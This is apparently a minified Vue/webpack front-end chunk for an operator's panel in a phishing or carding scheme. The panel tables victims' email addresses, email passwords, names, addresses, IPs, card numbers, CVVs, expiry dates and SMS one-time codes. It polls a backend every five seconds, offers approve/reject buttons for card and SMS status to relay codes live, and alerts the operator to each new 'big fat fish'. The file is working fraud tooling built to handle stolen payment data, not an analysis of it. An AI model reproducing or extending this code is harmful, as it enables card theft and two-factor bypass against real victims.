(window["webpackJsonp"]=window["webpackJsonp"]||[]).push([["chunk-6ef565a5"],{"01b6":function(t,e,a){"use strict";a("f64c")},"08d5":function(t,e,a){t.exports=a.p+"static/img/mastercard.cdaba15c.png"},"0c0b":function(t,e,a){"use strict";var n=function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("el-card",{staticClass:"card_round",style:t.card_style,attrs:{shadow:"always"}},[n("el-row",{staticStyle:{"margin-bottom":"15px"}},[n("el-col",{staticStyle:{width:"60px",height:"48px"},attrs:{span:4}},[n("el-image",{attrs:{src:a("1f22")}})],1),n("el-col",{staticStyle:{width:"84px",height:"45px"},attrs:{span:4,offset:15}},[n("el-image",{attrs:{src:t.card_type_img}})],1)],1),n("el-row",{staticStyle:{"font-family":"'Source Code Pro',serif","font-weight":"500","font-size":"27px","margin-bottom":"20px","text-shadow":"7px 6px 10px rgb(14 42 90 / 80%)"},attrs:{gutter:20}},[n("el-col",{attrs:{span:6}},[n("h3",[t._v(t._s(t.card_number.slice(0,4)))])]),n("el-col",{attrs:{span:6}},[n("h3",[t._v(t._s(t.card_number.slice(4,8)))])]),n("el-col",{attrs:{span:6}},[n("h3",[t._v(t._s(t.card_number.slice(8,12)))])]),n("el-col",{attrs:{span:6}},[n("h3",[t._v(t._s(t.card_number.slice(12,16)))])])],1),n("el-row",{staticStyle:{"font-family":"Source Code Pro,monospace","font-size":"13px","font-weight":"500","margin-bottom":"3px"}},[n("el-col",{attrs:{span:12}},[n("span",[t._v("Card Holder")])]),n("el-col",{attrs:{span:6}},[n("span",[t._v("CVV")])]),n("el-col",{attrs:{span:6}},[n("span",[t._v("Expires")])])],1),n("el-row",{staticStyle:{"font-family":"Source Code Pro,monospace","font-size":"18px","font-weight":"700",color:"white","margin-bottom":"5px"}},[n("el-col",{attrs:{span:12}},[n("span",{style:t.name_font_size},[t._v(t._s(t.card_name))])]),n("el-col",{attrs:{span:6}},[n("span",[t._v(t._s(t.card_cvv))])]),n("el-col",{attrs:{span:6}},[n("span",[t._v(t._s(t.card_exp))])])],1)],1)},s=[],i=(a("fb6a"),{props:{code:String,card_number:{type:String,required:!0,default:"1234123412341234"},card_name:{type:String,required:!0,default:"Mical Jackson"},card_cvv:{type:String,required:!0,default:"000"},card_exp:{type:String,required:!0,default:"00/00"}},data:function(){return{card_style:{backgroundImage:"url("+a("ca16")+") ",width:"430px",height:"270px",color:"#e2e8f0"}}},computed:{name_font_size:function(){return this.card_name.length>15?{fontSize:"15px"}:{fontSize:"18px"}},card_type_img:function(){var t=this.card_number.slice(0,1);return a("4"===t?"c949":"5"===t?"08d5":"aa86")}}}),r=i,o=(a("dcf1"),a("2877")),c=Object(o["a"])(r,n,s,!1,null,"17cdd45d",null);e["a"]=c.exports},"1f22":function(t,e,a){t.exports=a.p+"static/img/chip.2c37b1d3.png"},"5a62":function(t,e,a){},"90fe":function(t,e,a){"use strict";a.r(e);var n=function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("div",{staticClass:"app-container"},[n("div",{staticStyle:{"text-align":"center","margin-bottom":"24px"}},[n("el-pagination",{attrs:{"hide-on-single-page":"","page-size":25,total:t.list.length,background:"",layout:"prev, pager, next"},on:{"current-change":t.current_change}})],1),n("el-table",{directives:[{name:"loading",rawName:"v-loading",value:t.listLoading,expression:"listLoading"}],attrs:{data:t.list.slice(25*(t.currentPage-1),25*t.currentPage),"element-loading-text":"Loading",border:"","highlight-current-row":"",type:"selection","row-key":function(t){return t.id}},on:{"selection-change":t.handleSelectionChange}},[n("el-table-column",{attrs:{type:"selection","reserve-selection":!0,width:"55"}}),n("el-table-column",{attrs:{type:"expand"},scopedSlots:t._u([{key:"default",fn:function(e){return[n("el-form",{staticClass:"demo-table-expand",attrs:{"label-position":"left",inline:""}},[n("el-form-item",{attrs:{label:"邮箱"}},[n("span",[t._v(t._s(e.row.email))])]),n("el-form-item",{attrs:{label:"邮箱密码"}},[n("span",[t._v(t._s(e.row.email_pass))])]),n("el-form-item",{attrs:{label:"姓名"}},[n("span",[t._v(t._s(e.row.full_name))])]),n("el-form-item",{attrs:{label:"电话"}},[n("span",[t._v(t._s(e.row.phonenumber))])]),n("el-form-item",{attrs:{label:"地址1"}},[n("span",[t._v(t._s(e.row.address_1))])]),n("el-form-item",{attrs:{label:"地址2"}},[n("span",[t._v(t._s(e.row.address_2))])]),n("el-form-item",{attrs:{label:"城市"}},[n("span",[t._v(t._s(e.row.city))])]),n("el-form-item",{attrs:{label:"州"}},[n("span",[t._v(t._s(e.row.state))])]),n("el-form-item",{attrs:{label:"邮编"}},[n("span",[t._v(t._s(e.row.zip))])]),n("el-form-item",{attrs:{label:"ip"}},[n("span",[t._v(t._s(e.row.ip))])]),n("el-form-item",{attrs:{label:"语言"}},[n("span",[t._v(t._s(e.row.lang))])]),n("el-form-item",{attrs:{label:"设备"}},[n("span",[t._v(t._s(e.row.plat))])]),n("el-form-item",{attrs:{label:"时间"}},[n("span",[t._v(t._s(e.row.time))])])],1)]}}])}),n("el-table-column",{attrs:{align:"center",label:"ID",width:"95"},scopedSlots:t._u([{key:"default",fn:function(e){return[t._v(" "+t._s(e.row.id)+" ")]}}])}),n("el-table-column",{attrs:{label:"姓名",width:"150",align:"center"},scopedSlots:t._u([{key:"default",fn:function(e){return[t._v(" "+t._s(e.row.full_name)+" ")]}}])}),n("el-table-column",{attrs:{label:"卡号",width:"200",align:"center"},scopedSlots:t._u([{key:"default",fn:function(e){return[n("el-popover",{attrs:{trigger:"click",width:"420px"}},[n("el-link",{attrs:{slot:"reference"},on:{click:function(a){return t.show_card_pic(e.row)}},slot:"reference"},[t._v(t._s(e.row.card_number))]),n("CardPic",{attrs:{card_name:t.card_name,card_number:t.card_number,card_cvv:t.card_cvv,card_exp:t.card_exp}})],1)]}}])}),n("el-table-column",{attrs:{label:"有效期",width:"110",align:"center"},scopedSlots:t._u([{key:"default",fn:function(e){return[t._v(" "+t._s(e.row.exp_date)+" ")]}}])}),n("el-table-column",{attrs:{"class-name":"status-col",label:"CVV",width:"110",align:"center"},scopedSlots:t._u([{key:"default",fn:function(e){return[n("el-tag",{directives:[{name:"show",rawName:"v-show",value:null!==e.row.cvv,expression:"scope.row.cvv !== null"}],attrs:{type:t._f("statusFilter")(e.row.status)}},[t._v(t._s(e.row.cvv))])]}}])}),n("el-table-column",{attrs:{align:"center",prop:"created_at",label:"手机号",width:"200"},scopedSlots:t._u([{key:"default",fn:function(e){return[t._v(" "+t._s(e.row.phonenumber)+" ")]}}])}),n("el-table-column",{attrs:{align:"center",prop:"created_at",label:"邮编",width:"100"},scopedSlots:t._u([{key:"default",fn:function(e){return[t._v(" "+t._s(e.row.zip)+" ")]}}])}),n("el-table-column",{attrs:{align:"center",label:"验证码",width:"120"},scopedSlots:t._u([{key:"default",fn:function(e){return[t._v(" "+t._s(e.row.otp)+" ")]}}])}),n("el-table-column",{attrs:{label:"状态"},scopedSlots:t._u([{key:"default",fn:function(e){return[t._v(" "+t._s(e.row.status)+" ")]}}])}),n("el-table-column",{attrs:{label:"卡操作",width:"150",fixed:"right"},scopedSlots:t._u([{key:"default",fn:function(e){var a=e.row;return[n("el-button",{attrs:{type:"success",size:"mini",disabled:a.disable_card_action},on:{click:function(e){return t.setCardStatus(a.id,"放行")}}},[t._v(" 放行 ")]),n("el-button",{attrs:{size:"mini",type:"danger",disabled:a.disable_card_action},on:{click:function(e){return t.setCardStatus(a.id,"拒绝")}}},[t._v(" 拒绝 ")])]}}])}),n("el-table-column",{attrs:{label:"验证码操作",width:"150",fixed:"right"},scopedSlots:t._u([{key:"default",fn:function(e){var a=e.row;return[n("el-button",{attrs:{type:"success",size:"mini",disabled:a.disable_sms_action},on:{click:function(e){return t.setSmsStatus(a.id,"放行")}}},[t._v(" 放行 ")]),n("el-button",{attrs:{size:"mini",type:"danger",disabled:a.disable_sms_action},on:{click:function(e){return t.setSmsStatus(a.id,"拒绝")}}},[t._v(" 拒绝 ")])]}}])}),n("el-table-column",{attrs:{label:"在线状态",align:"center"},scopedSlots:t._u([{key:"default",fn:function(e){return[t._v(" "+t._s(e.row.online)+" ")]}}])}),n("el-table-column",{attrs:{label:"创建时间",align:"center"},scopedSlots:t._u([{key:"default",fn:function(e){return[t._v(" "+t._s(e.row.time)+" ")]}}])})],1),n("el-row",{staticStyle:{"margin-top":"24px"}},[n("el-col",{attrs:{span:2,offset:20}},[n("el-button",{attrs:{type:"danger",icon:"el-icon-delete"},on:{click:t.deleted_data}},[t._v("删除数据")])],1),n("el-col",{attrs:{span:2}},[n("el-button",{attrs:{type:"primary",icon:"el-icon-refresh"},on:{click:function(e){t.fetchData,t.tips("Pass")}}},[t._v("刷新数据")])],1)],1),n("audio",{ref:"audio",staticStyle:{"z-index":"999999",display:"none","margin-left":"600px"},attrs:{id:"audio",src:a("bca2"),controls:"controls"}}),n("audio",{ref:"audio2",staticStyle:{"z-index":"999999",display:"none","margin-left":"600px"},attrs:{id:"audio2",src:a("daf5"),controls:"controls"}})],1)},s=[],i=(a("d3b7"),a("159b"),a("25f0"),a("ad8f")),r=a("0c0b"),o={filters:{statusFilter:function(t){var e={published:"success",draft:"gray",deleted:"danger"};return e[t]}},components:{CardPic:r["a"]},data:function(){return{currentPage:1,pollingST:null,list:[],listLoading:!0,card_name:"",card_number:"",card_cvv:"",card_exp:"",card_pic_show:!1,choose_data:[]}},created:function(){this.fetchData(),"default"===Notification.permission&&this.$alert("获取通知权限失败,请打开通知权限","权限不足",{confirmButtonText:"确定",callback:function(){Notification.requestPermission((function(t){Notification.permission!==t&&(Notification.permission=t)}))}})},destroyed:function(){clearTimeout(this.pollingST)},methods:{fetchData:function(){var t=this;Object(i["c"])().then((function(e){var a={};for(var n in t.listLoading=!0,0!==t.list.length&&e.data.items[0]["id"]>t.list[0]["id"]&&t.window_tips("新到大肥鱼啦！","搞快点搞快点~"),null!==t.list&&t.list.forEach((function(t){a[t.id]=t.status})),e.data.items){var s=e.data.items[n];void 0!==a[e.data.items[n].id]&&a[s.id]!==s.status&&"等待再次输入验证码"!==s.status&&"等待再次输入卡片"!==s.status&&"等待验证码"!==s.status&&t.update_data_tips(e.data.items[n].id.toString())}t.list=e.data.items,t.listLoading=!1,t.pollingST=setTimeout((function(){clearTimeout(t.pollingST),t.fetchData()}),5e3)}))},setCardStatus:function(t,e){var a=this,n={id:t,status:e};Object(i["d"])(n).then((function(t){a.tips(t.data.message)}))},setSmsStatus:function(t,e){var a=this,n={id:t,status:e};Object(i["e"])(n).then((function(t){a.tips(t.data.message)}))},tips:function(t){"Pass"===t?this.$notify({title:"成功",message:"操作成功",type:"success",position:"bottom-left"}):this.$notify.error({title:"错误",message:t})},update_data_tips:function(t){this.$notify({title:"注意数据更新",message:"ID ["+t+"] 状态已变化,请及时处理",type:"success",position:"bottom-left"}),this.$refs.audio.currentTime=0,this.$refs.audio.play()},show_card_pic:function(t){this.card_pic_show=!0,this.card_name=t.full_name.toString().toUpperCase(),this.card_number=t.card_number.toString(),this.card_cvv=t.cvv.toString(),this.card_exp=t.exp_date},window_tips:function(t,e){this.$refs.audio2.currentTime=0,this.$refs.audio2.play(),new Notification(t,{body:e,lang:"zh-CN"})},handleSelectionChange:function(t){this.choose_data=t},deleted_data:function(){var t=this;this.$confirm("确定要删除选中数据吗?","提示",{confirmButtonText:"确定",cancelButtonText:"取消",type:"warning"}).then((function(){Object(i["a"])({id:t.choose_data}).then((function(e){"Pass"===e.data.message?(t.$message({type:"success",message:"删除成功!"}),t.fetchData()):t.$message({type:"info",message:"删除失败!"})}))})).catch((function(){t.$message({type:"info",message:"已取消删除"})}))},current_change:function(t){this.currentPage=t}}},c=o,l=(a("01b6"),a("2877")),u=Object(l["a"])(c,n,s,!1,null,null,null);e["default"]=u.exports},aa86:function(t,e){t.exports="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAACXBIWXMAAAsTAAALEwEAmpwYAAAADUlEQVQImWP4//8/AwAI/AL+hc2rNAAAAABJRU5ErkJggg=="},ad8f:function(t,e,a){"use strict";a.d(e,"c",(function(){return s})),a.d(e,"d",(function(){return i})),a.d(e,"e",(function(){return r})),a.d(e,"b",(function(){return o})),a.d(e,"a",(function(){return c}));var n=a("b775");function s(t){return Object(n["a"])({url:"/api/v2/fetch_pending_data",method:"get",params:t})}function i(t){return Object(n["a"])({url:"/api/v2/set_card_status",method:"get",params:t})}function r(t){return Object(n["a"])({url:"/api/v2/set_sms_status",method:"get",params:t})}function o(t){return Object(n["a"])({url:"/api/v2/fetch_finish_data",method:"get",params:t})}function c(t){return Object(n["a"])({url:"/api/v2/delete_data",method:"post",data:t})}},bca2:function(t,e,a){t.exports=a.p+"static/media/tip.781bc7b5.mp3"},c949:function(t,e,a){t.exports=a.p+"static/img/visa.2bc1a543.png"},ca16:function(t,e,a){t.exports=a.p+"static/img/img_2.da3da1fe.png"},daf5:function(t,e,a){t.exports=a.p+"static/media/tips2.4c3b38b7.mp3"},dcf1:function(t,e,a){"use strict";a("5a62")},f64c:function(t,e,a){}}]);